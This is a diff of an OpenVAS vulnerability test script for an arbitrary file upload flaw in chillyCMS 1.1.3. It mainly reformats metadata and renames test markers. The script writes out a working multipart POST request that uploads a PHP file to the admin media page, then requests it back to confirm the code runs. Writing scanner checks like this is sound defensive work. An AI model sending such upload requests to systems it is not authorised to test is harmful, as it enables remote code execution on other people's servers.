@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_chillyCMS_43263.nasl 8438 2018-01-16 17:38:23Z teissa $
+# $Id: gb_chillyCMS_43263.nasl 13660 2019-02-14 09:48:45Z cfischer $
 #
 # chillyCMS Arbitrary File Upload Vulnerability
 #
@@ -24,40 +24,46 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_summary = "chillyCMS is prone to a vulnerability that lets attackers upload
-arbitrary files. The issue occurs because the application fails to
-adequately sanitize user-supplied input.
-
-An attacker can exploit this vulnerability to upload arbitrary code
-and execute it in the context of the webserver process. This may
-facilitate unauthorized access or privilege escalation; other attacks
-are also possible.
-
-chillyCMS version 1.1.3 is vulnerable; other versions may also
-be affected.";
-
 if(description)
 {
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/43263");
- script_xref(name : "URL" , value : "http://www.chillycms.bplaced.net/chillyCMS/");
- script_oid("1.3.6.1.4.1.25623.1.0.100809");
- script_version("$Revision: 8438 $");
- script_tag(name:"last_modification", value:"$Date: 2018-01-16 18:38:23 +0100 (Tue, 16 Jan 2018) $");
- script_tag(name:"creation_date", value:"2010-09-16 16:08:48 +0200 (Thu, 16 Sep 2010)");
- script_bugtraq_id(43263);
- script_tag(name:"cvss_base", value:"4.6");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
- script_name("chillyCMS Arbitrary File Upload Vulnerability");
+  script_oid("1.3.6.1.4.1.25623.1.0.100809");
+  script_version("$Revision: 13660 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
+  script_tag(name:"creation_date", value:"2010-09-16 16:08:48 +0200 (Thu, 16 Sep 2010)");
+  script_bugtraq_id(43263);
+  script_tag(name:"cvss_base", value:"4.6");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
+  script_name("chillyCMS Arbitrary File Upload Vulnerability");
 
- script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "summary" , value : tag_summary);
- exit(0);
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 80);
+  script_exclude_keys("Settings/disable_cgi_scanning");
+
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/43263");
+  script_xref(name:"URL", value:"http://www.chillycms.bplaced.net/chillyCMS/");
+
+  script_tag(name:"summary", value:"chillyCMS is prone to a vulnerability that lets attackers upload
+
+  arbitrary files. The issue occurs because the application fails to
+  adequately sanitize user-supplied input.");
+
+  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to upload arbitrary code
+  and execute it in the context of the webserver process. This may facilitate unauthorized access or
+  privilege escalation. Other attacks are also possible.");
+
+  script_tag(name:"affected", value:"chillyCMS version 1.1.3 is vulnerable. Other versions may also
+  be affected.");
+
+  script_tag(name:"solution_type", value:"WillNotFix");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+
+  exit(0);
 }
 
 include("http_func.inc");
@@ -67,19 +73,21 @@ port = get_http_port(default:80);
 if(!can_host_php(port:port))exit(0);
 
 rand = rand();
-file = string("OpenVAS_TEST_DELETE_ME_", rand, ".php");
+file = string("VT_TEST_DELETE_ME_", rand, ".php");
 len  = 713 + strlen(file);
+
+useragent = http_get_user_agent();
 host = http_host_name( port:port );
 
 foreach dir( make_list_unique( "/chillyCMS", "/cms", cgi_dirs( port:port ) ) ) {
 
   if( dir == "/" ) dir = "";
-  url = string(dir, "/admin/media.site.php"); 
+  url = string(dir, "/admin/media.site.php");
 
   req =  string('POST ',url,' HTTP/1.1',"\r\n",
            "Host: ",host,"\r\n",
            "Proxy-Connection: keep-alive\r\n",
-           "User-Agent: ",OPENVAS_HTTP_USER_AGENT,"\r\n",
+           "User-Agent: ",useragent,"\r\n",
            "Content-Length: ",len,"\r\n",
            "Cache-Control: max-age=0\r\n",
            "Origin: null\r\n",
@@ -129,20 +137,21 @@ foreach dir( make_list_unique( "/chillyCMS", "/cms", cgi_dirs( port:port ) ) ) {
            'Content-Disposition: form-data; name="file"; filename="',file,'"',"\r\n",
            "Content-Type: application/octet-stream\r\n",
            "\r\n",
-           "<?php echo '<pre>openvas-upload-test</pre>'; ?>\r\n",
+           "<?php echo '<pre>vt-upload-test</pre>'; ?>\r\n",
            "------x--\r\n",
-           "\r\n"); 
+           "\r\n");
   recv = http_keepalive_send_recv(data:req, port:port, bodyonly:FALSE);
-  
+
   if(recv) {
 
     req2 = http_get(item:string(dir, "/tmp/", file), port:port);
     recv2 = http_keepalive_send_recv(data:req2, port:port, bodyonly:TRUE);
+    if (!recv2)
+      continue;
 
-    if (recv2 == NULL) continue;
-    if("openvas-upload-test" >< recv2) {
- 
-      report = string( 
+    if("vt-upload-test" >< recv2) {
+
+      report = string(
         "Note :\n\n",
         "## It was possible to upload and execute a file on the remote webserver.\n",
         "## The file is placed in directory: ", '"', dir, '/tmp/"', "\n",
@@ -150,8 +159,8 @@ foreach dir( make_list_unique( "/chillyCMS", "/cms", cgi_dirs( port:port ) ) ) {
         "## You should delete this file as soon as possible!\n");
       security_message(port:port, data:report);
       exit(0);
-    }  
-  }  
+    }
+  }
 }
 
-exit(0);
+exit(99);
